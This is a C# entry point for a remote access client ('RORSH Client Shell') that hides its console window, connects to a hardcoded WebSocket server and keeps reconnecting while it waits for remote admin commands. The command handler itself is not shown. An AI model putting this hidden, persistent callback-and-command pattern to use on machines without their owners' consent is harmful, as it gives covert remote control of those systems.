using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Threading;
using System.Threading.Tasks;

namespace RORSHClient
{
    /// <summary>
    /// RORSH Client Shell (RCS)
    /// Background service that connects to SecureCom server and awaits admin commands
    /// 
    /// Features:
    /// - Runs as background service (no GUI, no console window)
    /// - Auto-reconnects to server with exponential backoff
    /// - Regenerates RorshKey on each connection
    /// - Streams command output back to admin in real-time
    /// </summary>
    class Program
    {
        // Hardcoded server URL
        private const string ServerUrl = "wss://rorsh-openweb-ssh.onrender.com";
        private static WssClient _client;
        private static CancellationTokenSource _cts;
        private static bool _isRunning = true;
        private static int _reconnectDelay = 5000; // Start with 5 seconds
        private const int MaxReconnectDelay = 300000; // Max 5 minutes

        static async Task Main(string[] args)
        {
            // Hide console window on Windows
            if (OperatingSystem.IsWindows() && !IsDebugMode())
            {
                HideConsoleWindow();
            }

            Console.WriteLine("========================================");
            Console.WriteLine("  RORSH Client Shell (RCS) v1.0");
            Console.WriteLine("  Background Remote Access Service");
            Console.WriteLine("========================================");
            Console.WriteLine($"[Main] Server URL: {ServerUrl}");
            Console.WriteLine($"[Main] OS: {GetOsName()}");
            Console.WriteLine($"[Main] Host: {Environment.MachineName}");
            Console.WriteLine($"[Main] User: {Environment.UserName}");
            Console.WriteLine("========================================");

            _cts = new CancellationTokenSource();

            // Handle signals
            AppDomain.CurrentDomain.ProcessExit += (s, e) => Shutdown();
            Console.CancelKeyPress += (s, e) => { e.Cancel = true; Shutdown(); };

            // Main connection loop with auto-reconnect
            while (!_cts.Token.IsCancellationRequested)
            {
                try
                {
                    await ConnectAndRun();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Main] Connection loop error: {ex.Message}");
                }

                if (_cts.Token.IsCancellationRequested) break;

                // Wait before reconnecting
                Console.WriteLine($"[Main] Reconnecting in {_reconnectDelay / 1000} seconds...");
                try
                {
                    await Task.Delay(_reconnectDelay, _cts.Token);
                }
                catch (TaskCanceledException)
                {
                    break;
                }

                // Exponential backoff
                _reconnectDelay = Math.Min(_reconnectDelay * 2, MaxReconnectDelay);
            }

            Console.WriteLine("[Main] RCS shutting down");
        }

        /// <summary>
        /// Connect to server and handle messages until disconnected
        /// </summary>
        static async Task ConnectAndRun()
        {
            _client = new WssClient(ServerUrl);

            _client.OnConnected += (s, e) =>
            {
                Console.WriteLine("[Main] Connected to SecureCom server");
                _reconnectDelay = 5000; // Reset reconnect delay on successful connection
            };

            _client.OnDisconnected += (s, e) =>
            {
                Console.WriteLine("[Main] Disconnected from server");
            };

            _client.OnError += (s, msg) =>
            {
                Console.WriteLine($"[Main] Client error: {msg}");
            };

            await _client.ConnectAsync();

            // Wait until disconnected
            while (_client.IsConnected && !_cts.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(1000, _cts.Token);
                }
                catch (TaskCanceledException)
                {
                    break;
                }
            }

            await _client.DisconnectAsync();
        }

        /// <summary>
        /// Graceful shutdown
        /// </summary>
        static void Shutdown()
        {
            Console.WriteLine("[Main] Shutdown requested");
            _isRunning = false;
            _cts?.Cancel();
            _client?.DisconnectAsync().Wait(5000);
        }

        /// <summary>
        /// Hide console window on Windows
        /// </summary>
        static void HideConsoleWindow()
        {
            if (OperatingSystem.IsWindows())
            {
                var handle = GetConsoleWindow();
                if (handle != IntPtr.Zero)
                {
                    ShowWindow(handle, SW_HIDE);
                }
            }
        }

        /// <summary>
        /// Check if running in debug mode
        /// </summary>
        static bool IsDebugMode()
        {
# if DEBUG
            return true;
# else
            return false;
# endif
        }

        /// <summary>
        /// Get OS name
        /// </summary>
        static string GetOsName()
        {
            if (OperatingSystem.IsWindows()) return "windows";
            if (OperatingSystem.IsLinux()) return "linux";
            if (OperatingSystem.IsMacOS()) return "macos";
            return "unknown";
        }

        // Windows API imports
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}

// Build trigger: 2026-08-02T11:59:26.176583

// Build trigger v2.0.0: 2026-08-02T14:09:06.508494
